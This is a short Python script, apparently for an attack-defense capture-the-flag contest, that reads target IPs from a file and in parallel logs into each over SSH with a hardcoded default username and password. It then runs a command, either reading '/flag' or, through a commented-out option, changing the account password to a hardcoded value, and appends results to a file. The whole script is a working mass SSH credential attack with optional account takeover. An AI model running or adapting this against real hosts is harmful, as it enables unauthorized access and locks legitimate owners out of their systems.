#!/usr/bin/python3
# coding: utf-8

import paramiko
import threading
import queue
import time

port = 22
username = 'ubuntu'
password = 'venus'
newpass = 'kbqn2020'

# cmd = 'passwd'
cmd = 'cat /flag'

q = queue.Queue()
lock = threading.Lock()


def ssh_attack(ip, port, username, password, cmd):
    port = int(port)
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh.connect(hostname=ip, port=port, username=username, password=password)

    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=3)

    if cmd == 'passwd':
        if username != 'root':
            stdin.write(f'{password}\n')
        stdin.write(f'{newpass}\n')
        stdin.write(f'{newpass}\n')

    result = stdout.read()
    if not result:
        result = stderr.read()
    flag = result.decode('utf-8')
    lock.acquire()
    with open('flag.txt', 'a') as f:
        f.write(f'{flag.strip()}@{ip}\n')
    lock.release()

    ssh.close()
    
    return flag


def start_shell(ip):
    q.put(ip.strip(), block=True, timeout=None)
    iped = q.get()
    try:
        flag = ssh_attack(ip, port, username, password, cmd)
        print(f"[+] {iped} 执行成功")
        print(flag)
    except:
        print(f"[-] {iped} 执行失败")
    q.task_done()

def main():
    ips = []
    with open('ip.txt', 'r') as f:
        ips = f.readlines()

    th = []
    th_num = len(ips)
    for ip in ips:
        t=threading.Thread(target=start_shell, args=(ip.strip(),))
        th.append(t)
    for x in range(th_num):
        th[x].start()
    for x in range(th_num):
        th[x].join()
    # q.join()

main()